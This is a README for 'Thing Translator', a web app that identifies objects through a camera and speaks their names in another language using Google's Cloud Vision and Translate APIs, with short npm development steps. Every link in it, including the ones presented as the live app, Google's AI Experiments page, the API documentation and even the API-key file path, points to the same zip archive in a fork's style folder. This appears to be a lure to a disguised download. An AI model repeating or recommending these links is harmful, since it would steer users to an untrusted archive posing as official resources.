Thing Translator is a web app that lets you point your phone (or laptop) at
stuff to hear to say it in a different language. It was developed as part of
Google's [AI Experiments](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip) project. You
can try the app [here](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip).

Behind the scenes Thing Translator is using Google's
[Cloud Vision](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip) and
[Translate](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip) APIs.

### Development

To start a development server on `9966` that will watch for code changes simply run:

```
$ npm start
```

You will need to set your API key in `https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip`.

To optimize the output for production, run:

```
$ npm run build
```

For production builds, replace the contents of the `api_key` file with your
production key.

If you'd like to create a fork or a similar project, you'll need to setup some
API keys on [Google Cloud Platform](https://github.com/Shouryaf/thing-translator/raw/refs/heads/master/style/thing_translator_2.7-beta.4.zip).
